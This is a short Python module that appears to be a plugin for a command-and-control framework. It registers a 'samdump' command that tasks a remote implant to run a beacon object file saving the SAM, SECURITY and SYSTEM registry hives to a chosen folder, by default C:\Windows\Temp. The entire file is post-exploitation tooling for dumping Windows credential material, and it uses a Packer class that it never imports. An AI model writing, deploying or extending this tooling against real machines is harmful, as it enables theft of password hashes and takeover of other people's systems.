from vaelix_host import Agent, RegisterCommand
import re
import time

# https://github.com/EncodeGroup/BOF-RegSave/tree/master

def is_full_path(path):
    return re.match(r'^[a-zA-Z]:\\', path) is not None

def samdump(agentID, *params):
    TaskID : str    = None
    agent  : Agent  = None
    packer = Packer()

    num_params = len(params)
    path = ''

    agent = Agent( agentID )

    if num_params != 1:
        agent.ConsoleWrite( agent.CONSOLE_ERROR, "missing the path" )
        return True

    path = params[ 0 ]

    packer.addstr(path)

    TaskID = agent.ConsoleWrite( agent.CONSOLE_TASK, f"Tasked agent to dump the SAM registry" )

    agent.InlineExecute( TaskID, "go", f"regdump.{agent.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( samdump, "", "samdump", "Dump the SAM, SECURITY and SYSTEM registries", 0, "<folder>", "C:\\Windows\\Temp\\" )
